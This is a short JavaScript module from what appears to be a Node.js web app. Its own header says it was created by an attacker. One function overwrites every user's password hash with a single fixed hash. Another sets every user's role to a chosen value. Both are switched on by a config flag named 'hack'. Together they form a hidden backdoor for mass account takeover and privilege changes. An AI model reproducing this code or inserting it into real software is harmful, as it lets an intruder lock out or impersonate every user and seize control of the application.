// ===================================================================
// update stuff for ALL users, modified and created by attacker.
// ===================================================================

let config = require('../../../config.json'); //get config.json data.
let config_active = config.hack; // security
const User = require('../../models/user');//define the user part in the database and use it.
const globals = require('../../globals');//extra idk for what.
//define the function.
async function hashUpdate(active){
  try {
  if (active==true){
for (let user of globals.AllUsers){
  let change={};
  let userName = user.username;
  let HASH = "968652ef04b0a656eea7a05e1c49619f4bfd7338549b4ca57ee8ac8323ca8619"; //rekt.
  change.passwordHash=HASH;
  User.update(user, change);
  console.log('change: '+change+' for user: '+userName)
}
  }
  }catch(e){console.error('[HASH UPDATE]: '+e)}
}
async function roleUpdate(active,role){
  try {
  if (active==true){
for (let user of globals.AllUsers){
  let change={};
  let userName = user.username; //rekt.
  change.role=role;
  User.update(user, change);
  console.log('change: '+change+' for user: '+userName)
}
     }
  }catch(e){console.error('[HASH UPDATE]: '+e)}
}
module.exports={
  hashUpdate,
  roleUpdate
}